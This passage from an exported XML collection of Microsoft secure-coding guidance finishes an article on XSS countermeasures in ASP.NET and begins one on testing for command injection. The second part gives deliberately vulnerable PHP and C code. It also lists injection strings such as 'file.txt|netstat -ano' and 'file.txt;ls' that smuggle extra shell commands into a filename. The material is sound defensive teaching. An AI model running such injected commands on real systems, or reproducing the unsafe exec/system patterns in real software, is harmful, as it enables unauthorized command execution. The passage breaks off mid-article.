Width=&amp;quot;318px&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Height=&amp;quot;168px&amp;quot;&amp;gt;&amp;lt;/asp:TextBox&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button ID=&amp;quot;submitBtn&amp;quot; Runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;Submit&amp;quot; OnClick=&amp;quot;submitBtn_Click&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Additional Considerations&lt;/h1&gt;
&lt;p&gt;In addition to the techniques discussed previously in this How to, use the following countermeasures as further safe guards to prevent cross-site scripting:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Set the correct character encoding. &lt;/li&gt;&lt;li&gt;Do not rely on input sanitization. &lt;/li&gt;&lt;li&gt;Use the HttpOnly cookie option. &lt;/li&gt;&lt;li&gt;Use the &amp;lt;frame&amp;gt; security attribute. &lt;/li&gt;&lt;li&gt;Use the innerText property instead of innerHTML. &lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;Set the Correct Character Encoding&lt;/h2&gt;
&lt;p&gt;To successfully restrict valid data for your Web pages, you should limit the ways in which the input data can be represented. This prevents malicious users from using canonicalization and multi-byte escape sequences to trick your input validation routines.
 A multi-byte escape sequence attack is a subtle manipulation that uses the fact that character encodings, such as uniform translation format-8 (UTF-8), use multi-byte sequences to represent non-ASCII characters. Some byte sequences are not legitimate UTF-8,
 but they may be accepted by some UTF-8 decoders, thus providing an exploitable security hole.&lt;/p&gt;
&lt;p&gt;ASP.NET allows you to specify the character set at the page level or at the application level by using the &amp;lt;&lt;strong&gt;globalization&lt;/strong&gt;&amp;gt; element in the Web.config file. The following code examples show both approaches and use the ISO-8859-1 character
 encoding, which is the default in early versions of HTML and HTTP.&lt;/p&gt;
&lt;p&gt;To set the character encoding at the page level, use the &amp;lt;&lt;strong&gt;meta&lt;/strong&gt;&amp;gt; element or the
&lt;strong&gt;ResponseEncoding&lt;/strong&gt; page-level attribute as follows: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;meta http-equiv=&amp;quot;Content Type&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; content=&amp;quot;text/html; charset=ISO-8859-1&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;pre&gt;OR&lt;br&gt;&amp;lt;% @ Page ResponseEncoding=&amp;quot;iso-8859-1&amp;quot; %&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To set the character encoding in the Web.config file, use the following configuration.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;configuration&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;globalization &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; requestEncoding=&amp;quot;iso-8859-1&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; responseEncoding=&amp;quot;iso-8859-1&amp;quot;/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;/system.web&amp;gt;&lt;br&gt;&amp;lt;/configuration&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Validating Unicode Characters&lt;/h2&gt;
&lt;p&gt;Use the following code to validate Unicode characters in a page.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;using System.Text.RegularExpressions;&lt;br&gt;. . .&lt;/pre&gt;
&lt;pre&gt;public class WebForm1 : System.Web.UI.Page&lt;br&gt;{&lt;br&gt;&amp;nbsp; private void Page_Load(object sender, System.EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Name must contain between 1 and 40 alphanumeric characters&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // and (optionally) special characters such as apostrophes&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // for names such as O'Dell&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (!Regex.IsMatch(Request.Form[&amp;quot;name&amp;quot;],&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; @&amp;quot;^[\p{L}\p{Zs}\p{Lu}\p{Ll}\']{1,40}$&amp;quot;))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; throw new ArgumentException(&amp;quot;Invalid name parameter&amp;quot;);&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Use individual regular expressions to validate other parameters&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; . . .&lt;br&gt;&amp;nbsp; }&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The following explains the regular expression shown in the preceding code: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;^&lt;/strong&gt; means start looking at this position. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;\p{ ..}&lt;/strong&gt; matches any character in the named character class specified by
&lt;strong&gt;{..}&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;{L}&lt;/strong&gt; performs a left-to-right match. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;{Lu}&lt;/strong&gt; performs a match of uppercase. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;{Ll}&lt;/strong&gt; performs a match of lowercase. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;{Zs}&lt;/strong&gt; matches separator and space. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;'&lt;/strong&gt;matches apostrophe. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;{1,40}&lt;/strong&gt; specifies the number of characters: no less than 1 and no more than 40.
&lt;/li&gt;&lt;li&gt;$ means stop looking at this position. &lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;Do Not Rely on Input Sanitization&lt;/h2&gt;
&lt;p&gt;A common practice is for code to attempt to sanitize input by filtering out known unsafe characters. Do not rely on this approach because malicious users can usually find an alternative means of bypassing your validation. Instead, your code should check
 for known secure, safe input. Table 1 shows various safe ways to represent some common characters.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Table 1: Character Representation&lt;/strong&gt;&lt;/p&gt;
&lt;div&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;th&gt;Characters&lt;/th&gt;
&lt;th&gt;Decimal&lt;/th&gt;
&lt;th&gt;Hexadecimal&lt;/th&gt;
&lt;th&gt;HTML Character Set&lt;/th&gt;
&lt;th&gt;Unicode&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&amp;quot; &lt;/strong&gt;(double quotation marks)&lt;/td&gt;
&lt;td&gt;&amp;amp;#34&lt;/td&gt;
&lt;td&gt;&amp;amp;#x22&lt;/td&gt;
&lt;td&gt;&amp;amp;quot;&lt;/td&gt;
&lt;td&gt;\u0022&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;' &lt;/strong&gt;(single quotation mark)&lt;/td&gt;
&lt;td&gt;&amp;amp;#39&lt;/td&gt;
&lt;td&gt;&amp;amp;#x27&lt;/td&gt;
&lt;td&gt;&amp;amp;apos;&lt;/td&gt;
&lt;td&gt;\u0027&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&amp;amp;&lt;/strong&gt; (ampersand)&lt;/td&gt;
&lt;td&gt;&amp;amp;#38&lt;/td&gt;
&lt;td&gt;&amp;amp;#x26&lt;/td&gt;
&lt;td&gt;&amp;amp;amp;&lt;/td&gt;
&lt;td&gt;\u0026&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; (less than)&lt;/td&gt;
&lt;td&gt;&amp;amp;#60&lt;/td&gt;
&lt;td&gt;&amp;amp;#x3C&lt;/td&gt;
&lt;td&gt;&amp;amp;lt;&lt;/td&gt;
&lt;td&gt;\u003c&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;gt; (greater than)&lt;/td&gt;
&lt;td&gt;&amp;amp;#62&lt;/td&gt;
&lt;td&gt;&amp;amp;#x3E&lt;/td&gt;
&lt;td&gt;&amp;amp;gt;&lt;/td&gt;
&lt;td&gt;\u003e&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;br&gt;
&lt;h2&gt;Use the HttpOnly Cookie Option&lt;/h2&gt;
&lt;p&gt;Internet Explorer 6 Service Pack 1 and later supports an &lt;strong&gt;HttpOnly&lt;/strong&gt; cookie attribute, which prevents client-side scripts from accessing a cookie from the
&lt;strong&gt;document.cookie&lt;/strong&gt; property. Instead, the script returns an empty string. The cookie is still sent to the server whenever the user browses to a Web site in the current domain.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Web browsers that do not support the &lt;strong&gt;
HttpOnly&lt;/strong&gt; cookie attribute either ignore the cookie or ignore the attribute, which means that it is still subject to cross-site scripting attacks.&lt;strong&gt;
&lt;/strong&gt;&lt;/blockquote&gt;
&lt;p&gt;The &lt;strong&gt;System.Net.Cookie&lt;/strong&gt; class in Microsoft .NET Framework version 2.0 supports an
&lt;strong&gt;HttpOnly&lt;/strong&gt; property. The &lt;strong&gt;HttpOnly&lt;/strong&gt; property is always set to true by Forms authentication.
&lt;/p&gt;
&lt;p&gt;Earlier versions of the .NET Framework (versions 1.0 and 1.1) require that you add code similar to the following to the
&lt;strong&gt;Application&lt;/strong&gt;_&lt;strong&gt;EndRequest&lt;/strong&gt; event handler in your application Global.asax file to explicitly set the
&lt;strong&gt;HttpOnly&lt;/strong&gt; attribute.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;protected void Application_EndRequest(Object sender, EventArgs e) &lt;br&gt;{&lt;br&gt;&amp;nbsp; string authCookie = FormsAuthentication.FormsCookieName;&lt;br&gt;&amp;nbsp; foreach (string sCookie in Response.Cookies) &lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Just set the HttpOnly attribute on the Forms &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // authentication cookie. Skip this check to set the attribute &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // on all cookies in the collection&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (sCookie.Equals(authCookie))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; { &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Force HttpOnly to be added to the cookie header&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Cookies[sCookie].Path &amp;#43;= &amp;quot;;HttpOnly&amp;quot;;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; }&lt;br&gt;}&lt;/pre&gt;
&lt;h2&gt;Use the &amp;lt;frame&amp;gt; Security Attribute&lt;/h2&gt;
&lt;p&gt;Internet Explorer 6 and later support a new &lt;strong&gt;security&lt;/strong&gt; attribute for the &amp;lt;&lt;strong&gt;frame&lt;/strong&gt;&amp;gt; and &amp;lt;&lt;strong&gt;iframe&lt;/strong&gt;&amp;gt; elements. You can use the
&lt;strong&gt;security&lt;/strong&gt; attribute to apply the user's Restricted Sites Internet Explorer security zone settings to an individual frame or iframe. By default, the Restricted Sites zone does not support script execution.
&lt;/p&gt;
&lt;p&gt;If you use the &lt;strong&gt;security&lt;/strong&gt; attribute, it must be set to &lt;strong&gt;
&amp;quot;restricted&amp;quot;&lt;/strong&gt; as shown in the following.&lt;/p&gt;
&lt;div&gt;
&lt;div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div&gt;&amp;nbsp;&lt;/div&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;lt;frame security=&amp;quot;restricted&amp;quot; src=&amp;quot;http://www.somesite.com/somepage.htm&amp;quot;&amp;gt;&amp;lt;/frame&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Use the innerText Property Instead of innerHTML&lt;/h2&gt;
&lt;p&gt;If you use the &lt;strong&gt;innerHTML&lt;/strong&gt; property to build a page and the HTML is based on potentially untrusted input, you must use
&lt;strong&gt;HtmlEncode&lt;/strong&gt; to make it safe. To avoid having to remember to do this, use
&lt;strong&gt;innerText&lt;/strong&gt; instead. The &lt;strong&gt;innerText&lt;/strong&gt; property renders content safe and ensures that scripts are not executed.&lt;/p&gt;
&lt;p&gt;The following example shows this approach for two HTML &amp;lt;&lt;strong&gt;span&lt;/strong&gt;&amp;gt; controls. The code in the
&lt;strong&gt;Page_Load&lt;/strong&gt; method sets the text displayed in the &lt;strong&gt;Welcome1&lt;/strong&gt; &amp;lt;&lt;strong&gt;span&lt;/strong&gt;&amp;gt; element using the
&lt;strong&gt;innerText&lt;/strong&gt; property, so HTML-encoding is unnecessary. The code sets the text in the
&lt;strong&gt;Welcome2&lt;/strong&gt; &amp;lt;&lt;strong&gt;span&lt;/strong&gt;&amp;gt; element by using the &lt;strong&gt;innerHtml&lt;/strong&gt; property; therefore, you must
&lt;strong&gt;HtmlEncode&lt;/strong&gt; it first to make it safe.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; AutoEventWireup=&amp;quot;true&amp;quot;%&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;span id=&amp;quot;Welcome1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt; &amp;lt;/span&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;span id=&amp;quot;Welcome2&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt; &amp;lt;/span&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; private void Page_Load(Object Src, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Using InnerText renders the content safe-no need to HtmlEncode&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Welcome1.InnerText = &amp;quot;Hello, &amp;quot; &amp;#43; User.Identity.Name;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Using InnerHtml requires the use of HtmlEncode to make it safe&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Welcome2.InnerHtml = &amp;quot;Hello, &amp;quot; &amp;#43; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Server.HtmlEncode(User.Identity.Name);&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;lt;/Script&amp;gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>820d595d-b22c-4e7e-b8c2-104eb854d929</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Command Injection Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author>Andres De Vivanco</author>
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Applies to:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Programming languages that allow interaction with operating system commands such as C/C&amp;#43;&amp;#43;, Java, VB, PHP, Perl, and Python.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Command injection vulnerabilities are particularly dangerous as they allow unauthorized execution of operating system commands.&amp;nbsp; They exist because applications fail to properly validate and sanitize the parameters they use when invoking shell functions
 such as system() or exec() to execute system commands.&amp;nbsp;&amp;nbsp; Attackers with control of these parameters can trick the application into executing any system command of their choice.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;For example, a UNIX application lists the contents of a folder using the ls command.&amp;nbsp; It takes the string
&lt;em&gt;folder_name&lt;/em&gt; from the user and, without any validation, concatenates it to &amp;quot;ls&amp;quot; to build the actual command.&amp;nbsp; The application then passes the command (&amp;quot;ls
&lt;em&gt;folder_name&lt;/em&gt;&amp;quot;) to the system() function and grabs the results.&amp;nbsp; A command injection bug allows an attacker to inject an additional command in the input string&lt;em&gt; folder_name&lt;/em&gt;.&amp;nbsp; As a result the application is tricked into executing the attacker’s
 additional command.&lt;/p&gt;
&lt;p&gt;In order to properly test for command injection vulnerabilities, the following steps should be followed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1:&amp;nbsp; Understand Attack Scenarios &lt;/li&gt;&lt;li&gt;Step 2:&amp;nbsp; Analyze Causes and Countermeasures &lt;/li&gt;&lt;li&gt;Step 3:&amp;nbsp; Start Testing and Exploring &lt;/li&gt;&lt;li&gt;Step 4:&amp;nbsp; Fine-tune Test Cases&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 1:&amp;nbsp; Understand Attack Scenarios&lt;/h1&gt;
&lt;p&gt;The first step in testing for command injection vulnerabilities is to understand their attack scenarios.&amp;nbsp; There are two common types on command injection bugs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Direct command injection. &lt;/li&gt;&lt;li&gt;Indirect command injection.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Scenario 1:&amp;nbsp; Direct Command injection&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;The most basic form of command injection consists of directly supplying the additional command to the vulnerable application.&amp;nbsp;&amp;nbsp; First the attacker discovers that the application invokes a system command by directly passing user supplied data as arguments
 to the command.&amp;nbsp;&amp;nbsp;&amp;nbsp; Then the attacker supplies the malicious command as part of the expected arguments.&amp;nbsp; The application executes the original command and then the malicious one.
&lt;/p&gt;
&lt;p&gt;In detail:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Attacker discovers that application uses client input to execute a command. &lt;/li&gt;&lt;li&gt;Attacker supplies malicious command as part of the client input. &lt;/li&gt;&lt;li&gt;Attacker observes application executing additional command.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Scenario 2:&amp;nbsp; Indirect Command injection&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;This case of command injection consists of indirectly supplying the additional command to the vulnerable application possibly through a file or an environment variable.&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; First the attacker deducts that the application invokes a system command using data
 from an external source such as a file or an environment variable.&amp;nbsp; The attacker then modifies the contents of the external source to add a malicious command.&amp;nbsp;&amp;nbsp; Then the attacker waits or forces the application to execute the malicious command along with the
 original one.&lt;/p&gt;
&lt;p&gt;In detail:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Attacker discovers that application uses data stored in an external source to execute a command.
&lt;/li&gt;&lt;li&gt;Attacker edits the external source to include malicious command. &lt;/li&gt;&lt;li&gt;Attacker waits until the application executes the original command (or attacker attempts to bring the application to a state in which it will execute the command supplied).
&lt;/li&gt;&lt;li&gt;Attacker verifies that the application executes the injected command.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 2:&amp;nbsp; Analyze Causes and Countermeasures&lt;/h1&gt;
&lt;p&gt;During this step you will understand the cause of command injection bugs as well as common defenses.&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; This will help you look for bugs in code and recognize safe coding practices.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Command Injection Causes&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;There is one single cause for command injection bugs: poor input validation.&amp;nbsp; Any application that builds command strings using non-sanitized data is vulnerable to this bug. .&amp;nbsp; The following code snippets demonstrate command injection vulnerabilities. This
 PHP code running in Windows uses the input supplied by a text box in a form and invokes the exec function to type the file:
&lt;/p&gt;
&lt;pre&gt;&amp;lt;?php&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp; $command = 'type ' . $_POST['username'];&lt;br&gt;&amp;nbsp; exec($command, $res);&amp;nbsp; &lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp; for ($i = 0; $i &amp;lt; sizeof($res); $i&amp;#43;&amp;#43;) &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; echo $res[$i].'&amp;lt;br&amp;gt;';&lt;br&gt;&amp;nbsp;&lt;br&gt;?&amp;gt;&amp;nbsp;&lt;/pre&gt;
&lt;p&gt;A user can supply the following string to see the list of active connections in the server:&lt;/p&gt;
&lt;pre&gt;file.txt|netstat -ano&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;The following example in C&amp;#43;&amp;#43; (courtesy of OWASP [i]) runs in a POSIX compliant environment such as a Unix variant.&amp;nbsp; It uses input supplied by the command line to system and runs the cat command:&lt;/p&gt;
&lt;pre&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;#include &amp;lt;unistd.h&amp;gt;&lt;br&gt;&amp;nbsp;&lt;br&gt;int main(int argc, char **argv) {&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;char cat[] = &amp;quot;cat &amp;quot;;&lt;br&gt;&amp;nbsp;char *command;&lt;br&gt;&amp;nbsp;size_t commandLength;&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;commandLength = strlen(cat) &amp;#43; strlen(argv[1]) &amp;#43; 1;&lt;br&gt;&amp;nbsp;command = (char *) malloc(commandLength);&lt;br&gt;&amp;nbsp;strncpy(command, cat, commandLength);&lt;br&gt;&amp;nbsp;strncat(command, argv[1], (commandLength - strlen(cat)) );&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;system(command);&lt;br&gt;&amp;nbsp;return (0);&lt;br&gt;&amp;nbsp;&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;A user can supply the following string to list the contents of the see the contents of the server’s current directory:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;file.txt;ls&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;The code snippets above use two different functions that interact with the shell named exec() and system().&amp;nbsp; The following list compiles popular functions attacked during command injection:&amp;nbsp;&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;&lt;strong&gt;Function&lt;/strong&gt;&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;&lt;strong&gt;Language&lt;/strong&gt;&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;system, execlp,execvp, ShellExecute, _wsystem&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;C/C&amp;#43;&amp;#43;&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;Runtime.exec&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;Java&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;exec, eval&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;PHP&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;exec, open, eval, &lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;Perl&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;exec, eval, execfile, input&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;Python&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;Shell, ShellExecuteForExplore, ShellExecute&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;VB&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;h2&gt;&lt;em&gt;Command Injection Countermeasures&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Applications defend against command injection bugs by doing proper input validation and sanitization.&amp;nbsp;&amp;nbsp; Developers must look for all instances where the application invokes a shell-like system function such as exec or system and avoid executing them unless
 the parameters have been properly validated and sanitized.&amp;nbsp;&amp;nbsp; There are two possible ways to validate these parameters: using black lists or using white lists.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;Black lists check for malicious patterns before allowing execution.&amp;nbsp; In case of command injection, a black list might contain command delimiters such as a semicolon (;)vertical dash (|), double dash (||), double amp (&amp;amp;&amp;amp;) as well as dangerous commands such
 as rm, cp, cat, ls, at, net, netstat, del, copy, etc.&amp;nbsp; However, a major drawback impedes this countermeasure from being effective; unless the black list covers absolutely all dangerous possibilities, the adversary can find a variation outside of the black
 list to carry an attack.&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;White lists match against safe execution patterns.&amp;nbsp; If the data in question doesn’t match any of the safe patterns it is disallowed.&amp;nbsp; This solves the problem of new variations of dangerous constructs since any new (malicious) construct that doesn’t match
 a safe one is automatically blocked.&amp;nbsp; A common way to implement white lists is to match the input against a regular expression that indicates the safe format for the command.&amp;nbsp; However, regular expressions can be complex to write and interpret.&amp;nbsp; Developers
 must make sure they understand well how to write and interpret regular expressions before implementing this defense.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 3:&amp;nbsp; Start Testing and Exploring&lt;/h1&gt;
&lt;p&gt;During this step you will start testing your application with basic command injection strings and observing how the application reacts.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Start with a simple test string&lt;/em&gt;&lt;/h2&gt;
